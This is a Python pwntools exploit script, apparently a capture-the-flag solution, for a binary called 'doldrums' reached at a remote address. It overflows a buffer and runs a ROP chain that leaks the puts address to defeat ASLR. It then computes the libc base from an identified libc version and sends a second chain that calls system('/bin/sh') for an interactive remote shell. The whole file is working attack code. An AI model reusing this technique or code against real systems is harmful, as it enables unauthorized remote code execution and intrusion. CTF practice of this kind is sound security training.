#!/usr/bin/env python3

from pwn import *

elf = ELF("doldrums")
rop = ROP(elf)

# First ROP payload to get current puts address (for bypassing ASLR)
rop.call("puts", [elf.got["puts"]])
rop.raw(b"\xe6\x85\x04\x08")  # Main method
print(rop.dump())

# p = elf.process()  # Local testing
p = remote("46.101.107.117", 2113)

p.recvuntil("\n")
p.recvuntil("\n")
p.sendline(b'A' * 13 + rop.chain())
p.recvuntil("Ancient_Mariner\n")
p.recvuntil("\n")

puts_address = u32(p.recvuntil("\n")[:4].ljust(4, b"\x00"))  # put address (first 4 bytes)
print("remote puts address: " + hex(puts_address))  # Address changes with each run (ASLR)

# 'put' address always ends with 460 (ASLR doesn't change last 3 values because of paging)
# we can do the same exercise for 'gets', the address always ends with be0
# using https://libc.blukat.me/ we can determine the exact libc version which is libc6-i386_2.27-3ubuntu1.4_amd64.so

# libc = ELF("libc6_2.31-3_amd64.so")  # Local testing
libc = ELF("libc6-i386_2.27-3ubuntu1.4_amd64.so")

# Set libc base address (current puts address - libc puts offset, 0x067460 in this version)
libc.address = puts_address - libc.symbols["puts"]
print("libc base address: " + hex(libc.address))

# Second payload to get a remote shell
rop = ROP(libc)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
print(rop.dump())

p.sendline(b'A' * 13 + rop.chain())
p.interactive()
